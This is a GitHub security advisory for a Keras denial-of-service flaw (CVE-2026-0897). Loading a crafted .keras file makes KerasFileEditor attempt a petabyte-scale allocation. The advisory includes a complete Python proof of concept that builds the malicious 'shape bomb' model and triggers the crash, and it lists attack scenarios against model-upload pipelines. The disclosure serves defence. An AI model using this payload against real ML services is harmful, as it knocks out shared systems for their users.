# [H] Keras vulnerable to DoS via Malicious .keras Model (HDF5 Shape Bomb Causes Petabyte Allocation in KerasFileEditor)

## Summary
Severity: High
Advisory: GHSA-mgx6-5cf9-rr43
CVE: CVE-2026-0897
CWE: CWE-770
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-05-06
Source: https://github.com/advisories/GHSA-mgx6-5cf9-rr43
Type: github-advisory

## Affected
- PyPI: `keras` — affected >=3.0.0 <3.12.1
- PyPI: `keras` — affected >=3.13.0 <3.13.2

## Details
### Summary
Keras’s model loader (KerasFileEditor) unsafely loads user-supplied .keras model files containing HDF5-based weight files without performing any validation on HDF5 dataset metadata. An attacker can craft a .keras archive containing a valid model.weights.h5 file whose dataset declares an extremely large shape (e.g. (50_000_000, 50_000_000)), but stores only a few bytes. The .keras file remains small (100–400 KB) because HDF5 with gzip compression stores minimal data. During model loading, 
Keras executes:
`python
result[key] = value[()]   # loads entire dataset into memory`
value[()] instructs h5py to allocate RAM proportional to the dataset’s declared shape – in this case 8.88 PiB of memory. This results in: Immediate memory exhaustion Python / TensorFlow crashes Jupyter kernel kill System instability Full Denial of Service on any workload that processes untrusted .keras models This allows an attacker to crash any environment or pipeline that loads .keras models, including MLOps backends, training services, model upload endpoints, or automated pipelines.
### Proof of Concept
```
// PoC.py
import zipfile
import io
import h5py
import numpy as np
from keras.saving import KerasFileEditor

# Create a malicious .keras model containing a massive HDF5 shape bomb
def create_malicious_keras(path="bomb.keras"):
    hdf5_bytes = io.BytesIO()

    # Create an HDF5 file with a huge declared dataset shape
    with h5py.File(hdf5_bytes, "w") as f:
        d = f.create_dataset(
            "payload",
            shape=(50_000_000, 50_000_000),    # Extremely large shape → petabytes on load
            dtype="float32",
            compression="gzip",
            compression_opts=9
        )
        # Write minimal data so the file stays very small
        d[0:1, 0:1] = np.zeros((1, 1), dtype=np.float32)

    hdf5_bytes.seek(0)

    # Build a valid .keras archive structure
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("config.json", "{}")
        z.writestr("metadata.json", "{}")
        z.writestr("model.weights.h5", hdf5_bytes.getvalue())

# Generate the malicious model file
create_malicious_keras()

# Trigger the DoS vulnerability when Keras loads the malicious file
KerasFileEditor("bomb.keras")
```
### Expected Result
```
numpy._core._exceptions._ArrayMemoryError:
Unable to allocate 8.88 PiB for an array with shape (50000000, 50000000)
```
This crash occurs before any actual model processing, confirming the Denial-of-Service impact.
### Impact
This vulnerability allows an attacker to crash any system that loads a malicious `.keras` model file.

The attacker can:

- Cause immediate memory exhaustion (8+ PiB allocation attempts)
- Crash TensorFlow / Python interpreter
- Kill Jupyter kernels
- Break automated model-upload pipelines
- Crash MLOps servers that process user models
- Deny service to shared GPU/CPU environments

If a platform allows user-uploaded Keras models (training services, inference endpoints, AutoML tools, Kaggle-style platforms), this becomes a Remote Denial of Service vector.
Additional PoC Evidence (Video Demonstration)
Attached is a real-world proof-of-concept video demonstrating the crash and memory exhaustion when loading the malicious .keras model.

PoC Video (Google Drive):
[PoC Video](https://drive.google.com/file/d/1XAj57epTBWpj93GwHprHvb14WS9wpl5m/view?usp=drivesdk)

Finding: Critical memory-exhaustion flaw triggered by crafted .keras model files
Vector: Malicious metadata causing extreme tensor shape inflation
Impact: A 31 KB model forces an 8.88 PiB allocation attempt, immediately killing the process
Attack Scenario: Remote DoS on ML model processing pipelines and cloud inference services

Demonstration:
The PoC video shows the crash occurring on Google Colab.
Loading the malicious model consumed all system RAM and repeatedly terminated the runtime.
Severity is high enough that the compute quota dropped from 83 hours → 4 hours after only a few tests.
With larger payloads, this would instantly exhaust resources in real production pipelines.

## References
- https://github.com/keras-team/keras/security/advisories/GHSA-mgx6-5cf9-rr43
- https://nvd.nist.gov/vuln/detail/CVE-2026-0897
- https://github.com/keras-team/keras/pull/21880
- https://github.com/keras-team/keras/pull/22081
- https://github.com/keras-team/keras/commit/7360d4f0d764fbb1fa9c6408fe53da41974dd4f6
- https://github.com/keras-team/keras/commit/f704c887bf459b42769bfc8a9182f838009afddb
- https://github.com/keras-team/keras
- https://github.com/pypa/advisory-database/tree/main/vulns/keras/PYSEC-2026-73.yaml
